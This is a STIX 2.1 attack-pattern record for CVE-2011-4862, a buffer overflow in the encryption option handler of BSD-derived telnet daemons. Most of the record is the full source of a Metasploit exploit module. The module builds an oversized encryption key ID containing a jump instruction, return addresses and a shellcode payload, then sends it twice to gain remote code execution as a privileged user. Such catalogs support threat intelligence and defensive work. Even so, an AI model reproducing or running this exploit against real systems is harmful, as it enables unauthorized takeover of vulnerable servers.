{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--afd90eb4-bd5a-447c-b427-6a51dbfc5408",
    "created": "2024-08-14T16:57:06.139506Z",
    "modified": "2024-08-14T16:57:06.13951Z",
    "name": "Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow",
    "description": " This module exploits a buffer overflow in the encryption option handler of the Linux BSD-derived telnet service (inetutils or krb5-telnet). Most Linux distributions use NetKit-derived telnet daemons, so this flaw only applies to a small subset of Linux systems running telnetd. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/telnet/telnet_encrypt_keyid.rb",
            "external_id": "telnet_encrypt_keyid.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4862"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Exploit::BruteTargets\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the encryption option handler of the\n        Linux BSD-derived telnet service (inetutils or krb5-telnet). Most Linux distributions\n        use NetKit-derived telnet daemons, so this flaw only applies to a small subset of\n        Linux systems running telnetd.\n        },\n      'Author'         => [ 'Jaime Penalba Estebanez <jpenalbae[at]gmail.com>', 'Brandon Perry <bperry.volatile[at]gmail.com>', 'Dan Rosenberg', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2011-4862'],\n          ['OSVDB', '78020'],\n          ['BID', '51182'],\n          ['EDB', '18280']\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Payload'        =>\n        {\n          'Space'       => 200,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n        },\n\n      'Targets'        =>\n        [\n          [ 'Automatic',  { } ],\n          [ 'Red Hat Enterprise Linux 3 (krb5-telnet)', { 'Ret' => 0x0804b43c } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-12-23'))\n  end\n\n  def exploit_target(t)\n\n    connect\n    banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)\n    vprint_status(banner_sanitized)\n\n    enc_init      = \"\\xff\\xfa\\x26\\x00\\x01\\x01\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\xff\\xf0\"\n    enc_keyid     = \"\\xff\\xfa\\x26\\x07\"\n    end_suboption = \"\\xff\\xf0\"\n\n    penc = payload.encoded.gsub(\"\\xff\", \"\\xff\\xff\")\n\n    key_id = Rex::Text.rand_text_alphanumeric(400)\n\n    key_id[ 0, 2] = \"\\xeb\\x76\"\n    key_id[72, 4] = [ t['Ret'] - 20 ].pack(\"V\")\n    key_id[76, 4] = [ t['Ret'] ].pack(\"V\")\n\n    # Some of these bytes can get mangled, jump over them\n    key_id[80,40]  = \"\\x41\" * 40\n\n    # Insert the real payload\n    key_id[120, penc.length] = penc\n\n    # Create the Key ID command\n    sploit = enc_keyid + key_id + end_suboption\n\n    # Initiate encryption\n    sock.put(enc_init)\n\n    # Wait for a successful response\n    loop do\n      data = sock.get_once(-1, 5) rescue nil\n      if not data\n        fail_with(Failure::Unknown, \"This system does not support encryption\")\n      end\n      break if data.index(\"\\xff\\xfa\\x26\\x02\\x01\")\n    end\n\n    # The first request smashes the pointer\n    print_status(\"Sending first payload\")\n    sock.put(sploit)\n\n    # Make sure the server replied to the first request\n    data = sock.get_once(-1, 5)\n    unless data\n      print_status(\"Server did not respond to first payload\")\n      return\n    end\n\n    # Some delay between each request seems necessary in some cases\n    ::IO.select(nil, nil, nil, 0.5)\n\n    # The second request results in the pointer being called\n    print_status(\"Sending second payload...\")\n    sock.put(sploit)\n    handler\n\n    ::IO.select(nil, nil, nil, 0.5)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-23",
    "x_mitre_platforms": [
        "linux'"
    ]
}